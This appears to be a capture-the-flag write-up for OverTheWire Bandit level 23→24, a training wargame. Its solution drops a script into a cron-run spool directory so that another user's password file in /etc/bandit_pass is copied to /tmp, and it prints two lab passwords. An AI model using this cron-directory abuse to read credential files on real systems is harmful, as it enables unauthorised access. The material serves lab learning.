# Bandit Level 23 → Level 24

## Task
[-> link](https://overthewire.org/wargames/bandit/bandit24.html)

A program is running automatically at regular intervals from cron, the time-based job scheduler. 
Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and 
you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep 
a copy around…

## Solution

```shell
ssh bandit23@bandit.labs.overthewire.org -p 2220  # (with password 'gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw')
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
echo -e "#\!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/bandit24_stealed_password" > /tmp/steal_pass.sh && \
chmod +x /tmp/steal_pass.sh && \
chmod 655 /tmp/steal_pass.sh && \
cp /tmp/steal_pass.sh /var/spool/bandit24/foo/steal_pass.sh
# wait some time
cat /tmp/bandit24_stealed_password
```

## Result

We've got password `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`!
